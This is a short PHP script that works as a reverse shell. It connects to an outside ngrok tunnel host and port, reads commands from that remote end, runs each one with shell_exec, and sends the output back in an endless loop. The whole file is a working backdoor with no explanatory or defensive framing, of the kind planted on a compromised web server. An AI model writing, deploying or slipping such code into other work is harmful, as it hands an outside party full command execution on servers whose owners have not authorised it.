<?php
$host = '0.tcp.sa.ngrok.io'; 
$port = 15257; 

$sock = socket_create(AF_INET, SOCK_STREAM, 0);
socket_connect($sock, $host, $port);

while (true) {
    
    $command = trim(socket_read($sock, 1024));

    
    $output = shell_exec($command);

    
    socket_write($sock, $output);
}
?>

